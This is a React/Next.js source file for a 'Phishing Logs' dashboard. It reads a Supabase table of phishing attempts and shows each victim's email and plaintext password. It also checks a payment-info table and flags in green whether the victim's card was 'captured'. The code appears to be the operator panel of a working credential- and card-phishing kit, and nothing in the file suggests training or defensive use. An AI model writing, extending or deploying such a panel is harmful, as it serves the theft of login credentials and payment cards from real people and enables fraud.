'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from '@/components/ui/table';
import { supabase } from '@/lib/supabase';

interface PhishingAttempt {
  id: string;
  user_email: string;
  user_password: string;
  timestamp: string;
  card_captured?: boolean;
}

export default function LogsPage() {
  const router = useRouter();
  const [logs, setLogs] = useState<PhishingAttempt[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    async function fetchLogs() {
      try {
        const { data: { session } } = await supabase.auth.getSession();
        if (!session?.user) {
          router.push('/login');
          return;
        }

        // Fetch phishing attempts
        const { data: attempts, error: attemptsError } = await supabase
          .from('phishing_attempts')
          .select('*')
          .order('timestamp', { ascending: false })
          .limit(1000); // Limit for performance

        if (attemptsError) throw attemptsError;

        // Fetch all payment info emails for comparison
        const { data: paymentInfo, error: paymentError } = await supabase
          .from('payment_info')
          .select('user_email');

        if (paymentError) throw paymentError;

        // Create a Set of payment info emails for faster lookup
        const capturedEmails = new Set(paymentInfo?.map(p => p.user_email) || []);

        // Get latest attempt for each email
        const latestAttempts = new Map();
        (attempts || []).forEach(attempt => {
          if (!latestAttempts.has(attempt.user_email) || 
              new Date(attempt.timestamp) > new Date(latestAttempts.get(attempt.user_email).timestamp)) {
            latestAttempts.set(attempt.user_email, attempt);
          }
        });

        // Convert to array and add card capture status
        const logsWithCardStatus = Array.from(latestAttempts.values()).map(attempt => ({
          ...attempt,
          card_captured: capturedEmails.has(attempt.user_email)
        }));

        // Sort by timestamp, newest first
        setLogs(logsWithCardStatus.sort((a, b) => 
          new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        ));
      } catch (error) {
        console.error('Error fetching logs:', error);
      } finally {
        setLoading(false);
      }
    }

    fetchLogs();
  }, [router]);

  if (loading) {
    return <div className="p-8">Loading...</div>;
  }

  return (
    <div className="space-y-6">
      <h1 className="text-3xl font-bold">Phishing Logs</h1>
      <div className="rounded-md border">
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>Email</TableHead>
              <TableHead>Password</TableHead>
              <TableHead>Card Captured</TableHead>
              <TableHead>Timestamp</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {logs.map((log) => (
              <TableRow key={log.id}>
                <TableCell>{log.user_email}</TableCell>
                <TableCell className="font-mono">{log.user_password}</TableCell>
                <TableCell className={log.card_captured ? 'text-green-500' : 'text-red-500'}>
                  {log.card_captured ? 'YES' : 'NO'}
                </TableCell>
                <TableCell>{new Date(log.timestamp).toLocaleString()}</TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
      </div>
    </div>
  );
}
